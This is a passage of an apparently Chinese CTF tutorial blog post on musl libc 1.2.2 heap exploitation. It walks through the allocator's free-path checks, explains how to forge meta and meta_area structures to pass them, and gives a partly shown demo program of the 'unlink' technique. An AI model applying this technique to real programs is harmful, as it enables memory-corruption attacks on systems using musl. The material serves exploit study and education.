class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol>
<li>meta-&gt;mem == base，即meta中保存的group指针要正确。</li>
<li>index &lt;= meta-&gt;last_idx，即chunk的索引不能越界。</li>
<li>area-&gt;check == ctx.secret，即meta所在的meta_area的校验值正确。</li>
<li>offset &gt;= size_classes[meta-&gt;sizeclass]*index</li>
<li>offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)，这两个检查offset和chunk大小是否对应。</li>
<li>assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);，即检查offset是否越界。</li>
</ol>
<p>如果伪造的<code>meta</code>位于一个伪造的<code>meta_area</code>中，需要首先获取校验值<code>secret</code>并保存到<code>meta_area</code>开头，即这一页最开始的地方。</p>
<p>通过这个函数的检查之后，<code>nontrivial_free</code>的分支语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里要求<code>mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)</code>，因此要合理设置<code>meta</code>的两个<code>mask</code>的值。</p>
<p>之后调用了<code>free_group</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		ctx.usage_by_class[sc] -= g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">		step_seq();</span><br><span class="line">		record_seq(sc);</span><br><span class="line">		mi.base = g-&gt;mem;</span><br><span class="line">		mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">		<span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">		g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">		mi = nontrivial_free(m, idx);</span><br><span class="line">	&#125;</span><br><span class="line">	free_meta(g);</span><br><span class="line">	<span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们不能在if-else语句中跳转到else分支，那样会再一次调用<code>nontrivial_free</code>，因此要保证<code>meta</code>的<code>maplen</code>字段不为0。</p>
<p>这些检查与条件判断通过后，就可以成功释放假chunk了。</p>
<p>下面就是musl libc unlink漏洞的demo程序，如有任何非预期情况请与笔者联系，不胜感激。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> maplen:<span class="number">8</span>*<span class="number">8</span><span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[<span class="number">0x10</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> victim_1[<span class="number">0x8</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> victim_2[<span class="number">0x8</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> group* <span class="title function_">get_group</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* chunk)</span>&#123;</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> *)(chunk - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (chunk[<span class="number">-4</span>])</span><br><span class="line">        offset = *(<span class="type">unsigned</span> <span class="type">int</span> *)(chunk - <span class="number">8</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">group_addr</span> =</span> (<span class="type">void</span> *)(chunk - <span class="number">0x10</span>*offset - <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> group_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> meta* <span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* chunk)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span>* <span class="title">group_addr</span> =</span> get_group(chunk);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span>* <span class="title">meta_addr</span> =</span> group_addr-&gt;meta;</span><br><span class="line">    <span class="keyword">return</span> meta_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> meta_area* <span class="title function_">get_meta_area</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* meta)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta_area*)((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序用于演示musl libc中的unlink操作。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;测试环境：ubuntu 22.04，musl libc版本：1.2.2。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;鉴于musl libc的轻量性，与其相关的利用方式也较为单一。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序所演示的unlink是最为常用的一种利用方式之一。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;musl libc与glibc不同，在主程序的main函数开始执行时，内存分配器就已经完成了初始化。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;请注意：在一个group中分配出来的chunk很可能在地址空间上不相邻。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因为一个group需要确保每个chunk都能够容纳该范围内最大的chunk。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此，调试便是musl libc赛题的重中之重。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是刚刚进入main函数时堆的情况：\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;pwndbg&gt; mheap\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;          secret : 0xd8e803bc461ae35a\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    mmap_counter : 0x0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      avail_meta : 0x55555555a0e0 (count: 96)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       free_meta : 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot; avail_meta_area : 0x55555555b000 (count: 0)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  meta_area_head : 0x55555555a000\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  meta_area_tail : 0x55555555a000\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;       active[7] : 0x55555555a090 (mem: 0x555555558f40) -&gt; 0x55555555a0b8 (mem: 0x7ffff7ffef40) [0x80]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[15] : 0x55555555a068 (mem: 0x555555558d40) [0x1f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[19] : 0x55555555a040 (mem: 0x555555558940) [0x3f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      active[23] : 0x55555555a018 (mem: 0x555555558140) [0x7f0]\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可见已经有一些meta被链入到链表数组之中了。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;但这对做题的影响并不大，通过多次调试，我们就能够让自己的chunk进入想要的meta。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;接下来让我们尝试分配几个chunk。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* chunks[<span class="number">14</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">14</span>; i++) &#123;</span><br><span class="line">        chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x140</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;第&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> GREEN <span class="string">&quot;m%d\033[0m&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">        printf_color(GREEN, UNDEFINED, <span class="string">&quot;次malloc返回的地址为：&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%p\n\033[0m&quot;</span>, 